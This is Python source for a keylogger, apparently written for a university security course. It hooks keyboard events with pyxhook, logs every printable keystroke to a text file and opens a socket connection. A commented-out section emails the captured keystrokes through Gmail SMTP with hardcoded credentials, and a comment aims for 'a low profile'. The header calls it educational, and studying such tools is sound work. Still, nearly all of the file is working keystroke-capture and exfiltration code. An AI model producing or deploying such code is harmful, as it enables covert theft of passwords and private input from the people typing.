"""
Authors:
    Dominick Taylor (dxt9140@g.rit.edu)
    Bikash (bm7514@g.rit.edu)
    Isza

Created: 2/28/2018

A simple keylogger file that captures user key events using the pyxhook package.
Note, this is NOT intended as a malicious program. It is used to understand
security principles and demonstrate mastery of secure programming techniques.
"""

import pyxhook
import time
import threading
import smtplib
import socket

running = True
string = ""

# Email Logs
class TimerClass(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()

    def run(self):
        global running

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        hostname = socket.gethostname()
        port = 35476
        connection = (hostname, port)

        while running:
            try:
                s.connect(connection)
                print("connection established")
                break
            except:
                pass

        s.close()

        """
        while not self.event.is_set() and running is False:
            with open("test.txt", 'r') as datafile:
                data = datafile.read()

                # Initialize mail server for data transport
                SERVER = "smtp.gmail.com"
                PORT = 587
                USER= "ritfakelogger@gmail.com"
                PASS= "fakekeylogg"
                FROM = USER
                TO = ["dxt9140@g.rit.edu"]
                SUBJECT = "Keylogger Data"
                MESSAGE = data
         
                try:
                    # Connect to the server and send the message
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, SUBJECT, MESSAGE)
                    server.quit()
                    with open("test.txt", 'w') as clear_file:
                        clear_file.write("")
    
                I don't think we should print things to the console. We want
                a low profile. Remove?

                @Todo
                except Exception as e:
                    print(e)

            # Why wait?
            self.event.wait(1)
        """

    def cancel(self):
        self.event.set()

def keyDownEvent( event ):
    global running
    global string
    global test_file

    if event.Ascii == 8:
        string += "<bs>"

    # Only write printable characters
    elif event.Ascii >= 32:
        string += chr(event.Ascii)

    # Esc ends the program
    if event.Ascii == 27:
        test_file.write(string)
        running = False


def main():
    global running
    global test_file

    # Clear the data file. Can be removed later once I actually want to
    # receive emails.
    test_file = open("test.txt", "a")

    # Create PyxHook object
    keyboard_hook = pyxhook.HookManager()

    # keyDownEvent function is called when keydown is detected
    keyboard_hook.KeyDown = keyDownEvent

    # hook the keyboard to listen
    keyboard_hook.HookKeyboard()

    # Begin the keyboard hook thread
    keyboard_hook.start()

    # Create the thread that will send the data when the server connects
    sender = TimerClass()
    sender.start()

    while running:
        time.sleep(.01)

    # close thread
    sender.cancel()
    keyboard_hook.cancel()
    test_file.close()

if __name__ == '__main__':
    main()

#------------------------------------
# End of file

